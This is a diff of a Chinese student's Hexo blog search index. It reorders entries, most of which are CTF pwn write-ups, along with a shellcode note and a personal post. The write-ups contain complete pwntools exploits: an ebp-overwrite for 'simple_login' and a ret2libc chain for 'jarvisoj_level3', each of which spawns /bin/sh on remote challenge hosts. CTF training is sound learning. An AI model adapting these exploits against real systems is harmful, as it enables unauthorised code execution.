-  </entry>
-  <entry>
-    <title>pwnable_simple_login</title>
-    <url>/2022/01/21/pwnable_simple_login/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
-<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
-<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
-<p>继续看IDA，main函数</p>
-<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
-<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
-<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
-<p>于是继续找，找到auth函数里有了一个漏洞点</p>
-<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
-<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
-<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
-<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Authenticate : &quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(<span class="number">0x0804927F</span>)+p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload=payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>最后</p>
-<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jarvisoj_level3</title>
-    <url>/2021/06/28/jarvisoj-level3/</url>
-    <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
-<p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
-<p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
-<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
-<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
-<p>果然漏洞就在这个函数里</p>
-<p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
-<p>解题思路和前几个题都类似了</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.通过write函数泄露libc版本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>2.计算libc基址，算出system和/bin/sh的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>3.构造rop，执行system(‘/bin/sh’)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28991</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_base+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>cat flag</p>
-<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -754,6 +726,34 @@
       </tags>
   </entry>
   <entry>
+    <title>pwnable_simple_login</title>
+    <url>/2022/01/21/pwnable_simple_login/</url>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
+<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
+<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
+<p>继续看IDA，main函数</p>
+<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
+<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
+<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
+<p>于是继续找，找到auth函数里有了一个漏洞点</p>
+<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
+<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
+<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
+<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Authenticate : &quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(<span class="number">0x0804927F</span>)+p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload=payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后</p>
+<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ret2text</title>
     <url>/2021/06/20/ret2text/</url>
     <content><![CDATA[<span id="more"></span>
@@ -775,6 +775,23 @@
 <p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
 <p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
 <p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode</title>
+    <url>/2021/11/22/shellcode/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
+<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcod</span></span><br></pre></td></tr></table></figure>
+
+<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -869,6 +886,20 @@
       </tags>
   </entry>
   <entry>
+    <title>飞蓬大将军</title>
+    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
+    <content><![CDATA[<span id="more"></span>
+<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
+<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bjdctf_2020_router</title>
     <url>/2022/01/21/%E5%88%B7%E6%96%B0%E4%B8%89%E8%A7%82%E7%AC%AC%E4%B8%80%E9%A2%98(bjdctf_2020_router)/</url>
     <content><![CDATA[<span id="more"></span>
@@ -888,37 +919,6 @@
 ]]></content>
       <categories>
         <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>飞蓬大将军</title>
-    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
-    <content><![CDATA[<span id="more"></span>
-<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
-<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
-]]></content>
-      <categories>
-        <category>日常闲话</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode</title>
-    <url>/2021/11/22/shellcode/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
-<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcod</span></span><br></pre></td></tr></table></figure>
-
-<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -996,6 +996,28 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
+    <title>大一生活结束了</title>
+    <url>/2021/09/28/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="c015426add05e765a33876f2aaff71d078629c49f9e87326a4b41eaf70d966eb">7edd006ae50f8a7d3d59bda4b0bd2cebba194e7fdd2d3626eff0cb845a0c5eae8ce6fac015691ba2429c13b85744472bb3856b7bde8de97d312595581fd81ebee0fb2b88122a759b2e0eddbecc730187cb9e83f483a57c8066c830c825c7feb0d7f9f32ef53d0c427b50e859ddc6e63de00f0651cebeb748689cf60a63e1338e7968d93a47cc1808e7e6f403d52813995b2f47d0e455b37bba78c4f371e03f7781030112c2dc7f6b75a08683d2c3aa528420da1a49a5be75796424231f203ab113dd50b45e18ac05e7de758a5a9f42f397752a5228085b26813ae0b4efa741fe31818c670ca244c23b893179c625fb3155424d876f381af4d3bf754821ba911aaa3f31414a8e2d58caa42e451225c65bd13dfd150bb41dfbd7cd5446aab426daff4691f5ae1a943874f0da19ed0d89a8fc971bd59172ca831f864ae950a615edabdb44a1129360156063791aa21601c0e748142768a843bd0f0451f53827363eafa9d9f181d9fc9191f591246101b5a6ccd165b30f0de7e1e00be2b5ee105b3550f3f88543c8d20ba64ad6a7df3a97528ac637cc81ec61a58587b9114c1f9dddbdb5e5c4da3ea16136d769ec93ba86454d8659298346db33165f47623c66bfa66a5f967308c7d4f807dfefc9c0c3ded8c15e0f5506fb4ce6a97ac4472d6e22beb9903d9eb361a46a95837db070425ee591720892d85590779dad73fb1018107a3a7a15fb4543292da1107b52c37dbdc291c1490b8c71b25455410dc3820d39f6d0899a913826cb23eca4c4e306185f4fbc66ee169c7bde55cbb8149264dcaaa4720e94afb2b06ebfc2c17831449079c2bda7c1174070a6cd4466c10023ac872f0ab4cbe40d46e75f3a4a4206e80350cc46f10ee9902722a269774466b1aaddae9ee2a5a03bb09b506ebca26afddd3dd2b2778e0198233f87f14bbe96cd12abe7044f4135ee3eb630cb6cfd10912f6fdca0bf998593398a30dbaad2f9b7e478890a6ce45894600076b252f25eaa2b2ddfa5d37b9f0fdd9899335179f34d6ebb26eb8fccc90db1ba83a23ee4024868da32cafc665e4620aa3cb96a38cf5070dd15dee0189fd7fbaca76b0617ee88da9589fe92eb034b92b41d06ba4374f9af1a25b0adb7096099382a7bc579c0215a97fa42240f8849cfe593ff37d659adada2b44724eec1b2269b41714607401c906883b5b2b6ba9f049443a0ba7b91779e78dccdf582e3d121c4490f8c2b0bb8ebdc45813f6fc83c7ea4634ef390ef05fe95ece1c1de8978660a514581a88c843618b8149230b2953156c2ae8e72c532c399b84db2423e1bbad82c777bd66d0f2725890b5b32c13cb5130d46545e675fddc63f005fffb6c736a2eb89d7706526e5decaed13a1ad0aa1f396ea813bfb932dde87dffb73ac41275f6b0e111d8c3a0b2f4eece0b6a5073edddab2ed3cf2dad3f360ad1cc4e2a8e04bcc468fcaacc5e9189c2f3b88dfcec5aac30a63cf89a3d85d6120f2d2e2dc1e321a9cdacd69cba6a5f2cb89e59efd5f40538077d40efbac207346671ddb3b81942a863d7bd162ab8cf3d6202a08bd47a168952ce10719a68bcfea7df9b989550753d426ce655a5ce512b98a09d7105bacf1d2658895d6b00f7127b8963ec321583e4ef479d0dffbc6e9f79558bf74b92c7471780eee727b3375b787c52e762e6b33f253fd5982382157daef6e4f2009418beadfd6215d8d6fdbb5f3ad5e401ecba0ec6ae536850adac4c40c5e827c36f635feac943e9a74692b2e80817dcf4f535c3074381e2f384fbe58d05f02645552cb71f4ac8f092c414698031c33303b6924afa626746a5ebb6772929fd9f0a1cd6c2397562a190e0c8a00a16fa290c9cc7a02728bbb21916e830743cf32bc9b9b922b2fe228d6b6b9a2c16e6e2457111ba2ca353cc3438e717082029bb02bf5879f26022b8b6ab6575a36645d1f5e56f21b226003881b5392244511e744da1f187bdb5c6672a1577e818d987e7f2196012310a40faab4a4b00ee9410197a72cceb031192d4e64334f5d622add74692f610fda75db798e98b92a0a23b2e904b9719b3842467623848a9db996ba8698c420f827ae07d1201199baf44012ed4f93212df8a9b99bed8ab79836aa5d3754cc550ab261797ceb9803dabe1514ad62015c23675d2290f6807c512f37b18798970583b0d86d7a33e452a69fbe2397d5248acf2c6e7492310ded5589a0c28323d8228c7f16da83b12322c280a0a9c3e5db5c47c5221deace81e21e65de96ca766615650f18ba2d1ad649da18522007b3e5bee95508f5109df0adaf9e82b1ed81d35def07d28d169a5132183b67556a0c8b0af1e7c9cbeb27b4d45e7f924c5fdc71dd95164fda6a54a83ad575f4234789949a30fb978a02dc175954d6e07b9becb9d1f123a55e3371876734de6db670f5e32d4982cbfa5b0d33a90eec624614855890422c279c5726d2ad30b66fab5b8a4d9a33be5ef873f58b89bf4cf22f668b473b3cbff4dbcb9c204695a241b4c67c9e68a545fdfb87c0938ac79850bffa9fc3765cf3634c9628116ecebdcc297b050cdc9032082a595a20ebf024f6905d2e145108e3d85f091244a4825d94983bb93594b75ae235e19867a4c9f8b751bbc3e0eaabc99996b478603806afc4aa77268aefeeba80f1de024da1f7fc5bfd66d6edfac623f931afd0721899667dfdef6829b349835f05a6acbd4ec3cee290e8d7a5d8d1bdd05dc7d078886d89ec80ec2bb41d97252c4f965cb9c0cff4cad0c79f25c32fedcdb3b3f35205bbd8d5f3b26b438e80754593b511d146ec58ba24dafc28b16219c7aa0f8716f0054b6ae05a0f9fa7742738bb9692a69149d9b2450495e44efaebaf52ed1c637ce654a7233a6eca5286bf5988d6d5ff2bf962dd588a48651144939909b7cb153f2353f64290c4308793f8b474643bb3a6253b60139354dcddf5606fc0c9becb730341e48cb040d97ea4b4187881820fea49a429f67b4d860d0a529fad393e801b25b4b86848d93d5fc9281f349e12193ed8507a71150136442d815f30aef4d644dad32d9e33e02802d0d5b113d8f0fcc01645a0c523f4def20c65ed156c695a55a3c028311170c5d05799f5ec13c4fb0ad96e6831890bf60d8f9f496a17425b1017ffce295b990f3cd98a5489a4c9c0a99c1168cbed2cdb418fbe798edbc76008f9af138d7f8406d82832b1e275c438f4b6a854d7498f2a6e67df32e930274c3b72d2af5a22979ce49a9180a7ce99ab45e1100f7d9f6cfa7c56c1fb7a7e302cdb28169496fb7c0f8096c9ed55c07e7aea39afddd3fde6cae4798d76e43de2f9eaf45afc7d7b3fd3891eaf2a02dbf3783d3d2cc57ffbcc35d3f55aa4c43c23e3ea2dd14df7279a80a60d9266c21f49d0b3c02339a3a16f2c91d8a87c06c5f675049f6d4b374c0daf5f54d52a64ddcc4329761b84c9c40b5f3196ec38f23c143aa0f8b93c6359df69af5c325db787274d77f26db9ecee6f13870bb58a1bd3e0b7e5b4a1e9fb7c69d18ba062c511e56d6b90a6327b12d1a19eabb551667c64be1d7806288c40f68ad6a9a17f33c5e3e9f27d20fb2d5d70521120d6f4a79c9a75425e87c4d64e09f5920f2085017a2fd341578ce3d228a6f5ff271c793ea110815b1ca0bc1789582822eeba6530ec9b221d547af1c9ec2db826264c4acc5fb0e9dd2a5e4dcefe5f9b663ca209112c0c85242c989f5f5f5aee2d2380d0664692a027e6170116d0c8f4f8b2341ff5b0bfbc149e63cf6e9d99dbf5b7ce299ab600957603b13af30df691020ee3619c8e5b705a738f952734611d295941f9f1313e6e3275d151943a72ae6fc69dc2b08058aa8016fea8ad75e9c66841f50f4e06eec2514d958285f3e0f8ec6bd8f35fa511adf007e9551e8bf9de691e2fd1f43fd17bde44050c55a250d2ef761d49edc47d9e6f9f209f6f7d3e049217fd0df52caafa51541fa4de21d341b5082da94adf183fbed182bf11638aa8565a6a6161854a1154dc647c4d2c2ffa6d4ee0f78c43f5138c9afc9b8d5a3fc14a5d3370064e8f4bcc22162443f1c98002968975539d499299da40954b7c08c12cba9ce573a43f91f3db55c72289c561549420c534362b48a681e589a4a78e81f6a63018bc36bf78b01a115940cdbdd303cc38bd31401aac7f996f9c24d1aafad7c99d14dfbe60ef6c057dfebaa6420c7a76584d3dd72a94964a798f78d439b018cc7d94303db8f4226569ab51fd00164474c3c675a2693ea5a2762dccc9af9276986c8e0c807efeb115099a97e9a5c5fb06104f58d7afdb93437f1239dbc6f906add6926f733219ba90e6ac4c7712100a0984c57bf8c9e7fa2b8538ea49a261fb1b868123e459b3b6d17354300bb838c3d5791d324ad22979c632691fee5e833040245715955745438d5d5f4390c2ee9aa28ab60fb2bd4509f6afdd8a901eb2624fdf3a7a7093526774c8d04e1e4041a370d3343d444f1ea8e16195f93b303fd47a62180db27ce9cf6196bc0f639dabd9d93293bfd0ee3b57b3755553b0865b9d886b7cc889ada856c66545a2859f938bbcb894488e522899f0073ab0454b8951c08e191d6e8b2b2d5867e89a58dbddba103c23a7bcbf072d57d9e50549b2af3b4b738d3023428b5a5873083585492bd590cd511cf4c1bb6de97a42cfc5cd04fef8c1a82f04a12bfbe304f57b5f94bc07013e9a5033f49cc9b91b8c35f1a7de0a7ae3bc04fef24470aa4eb98d137e4d24ac03568d56c0e3f5c41cccf7a797e62d183e26e44cae335ed6ee454e1894e9a890343f0c9ef91e8adddfe25faf2907213af64e53baa51f08605a19de51be8b0d6e70c5bab4f5469a84ca847221072d3e7bc61eddf16ea8b0f7ae34933820f4c85e69dd346a207ec27fa80a9679a9fd558eb569f8910883e92812a1f9b673f276fac5df50075a019d99b419750f76109e2f3db003fa97bd8eb9b5cfff9df06f06d5c8db460a01498895da42f3935983e2db92f63afce0d1f5ccb04147c0fd40eec550518bbf0a6dc235f4da2046d0709efdcbb1f5cd0b78d803f4875ef0a14a718492be731bb108ae0b6579b41cd70298baa657e87a248def5c0e1915d241f3a2fe35028f28c2d4a1fcc1361d153c829c91066903e9075cfb5b7340088ac2b77ef8847d0d9d16526467ecbe12a962c19f9a039320afba25510a8425f6a20e27df5da28c7af99d3e2def5fc6a5069fa80eeb82b412431b9381283fdfefcd3c0538a559e349c4cee1bbf892d1741ef876dcfb15600fd107d3e120e68088e76c63dede4e199da9b50418569b60ca8afa0cd5520e66511e61068cbedfd495d5b318ac2ad06701390ac38156865796d0e5a8aca8dd7165de4b17db113f31d425e799b934819ac656123dc0e8a53765d93eb9e548ad06700254159eadf7c6256d85d231e2abe2aa2d6a663baf1f8e41236d24a36cab9242362220f2e8828ee6bc0712d7574ecf9c5e5f4d91080344fcad78596105dab983be5ac9844c2ea0857a7ac3ddef23ce2ad608fd873195d8a4a9d369e8ff3550ce0de518161d08f4e62a71da86b13553bbf235c92a266ddfbd749af3e9d81239c1230f8f6c63e4fd97ca5bd2b3d10f96edcd88f81521c53c84564666a0c0b304db3a090452ce995623b896968d3030d54c325ff70a2c469c61461031b53cb90a0995ea6d5e9e09273e813a74b00d248091855d14c03584c79022556a5b9f1c3cf0da0193f5324477bd970bf876e0c6c56bea71ce4f907edb74b6e862707edcf31ee0db53b4beabd7941b178b46790c14fc09fe64b2a77e685e8d3c5527448c89617d44d5e50f3e54d90b86bea45783b59cd4c32693ede25cef0f94ac60d420108dfa5b7c28dcadb2e87819ee842a5cb8e4b6278f728e326aced5ae7788e831c647cbe0357b4e36f9895ec21a7bca25fe5295bb3c379512</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>寒假学习(一)</title>
     <url>/2022/01/22/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%882022.1.17-2022.1.23%EF%BC%89/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1036,22 +1058,33 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>大一生活结束了</title>
-    <url>/2021/09/28/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="c015426add05e765a33876f2aaff71d078629c49f9e87326a4b41eaf70d966eb">7edd006ae50f8a7d3d59bda4b0bd2cebba194e7fdd2d3626eff0cb845a0c5eae8ce6fac015691ba2429c13b85744472bb3856b7bde8de97d312595581fd81ebee0fb2b88122a759b2e0eddbecc730187cb9e83f483a57c8066c830c825c7feb0d7f9f32ef53d0c427b50e859ddc6e63de00f0651cebeb748689cf60a63e1338e7968d93a47cc1808e7e6f403d52813995b2f47d0e455b37bba78c4f371e03f7781030112c2dc7f6b75a08683d2c3aa528420da1a49a5be75796424231f203ab113dd50b45e18ac05e7de758a5a9f42f397752a5228085b26813ae0b4efa741fe31818c670ca244c23b893179c625fb3155424d876f381af4d3bf754821ba911aaa3f31414a8e2d58caa42e451225c65bd13dfd150bb41dfbd7cd5446aab426daff4691f5ae1a943874f0da19ed0d89a8fc971bd59172ca831f864ae950a615edabdb44a1129360156063791aa21601c0e748142768a843bd0f0451f53827363eafa9d9f181d9fc9191f591246101b5a6ccd165b30f0de7e1e00be2b5ee105b3550f3f88543c8d20ba64ad6a7df3a97528ac637cc81ec61a58587b9114c1f9dddbdb5e5c4da3ea16136d769ec93ba86454d8659298346db33165f47623c66bfa66a5f967308c7d4f807dfefc9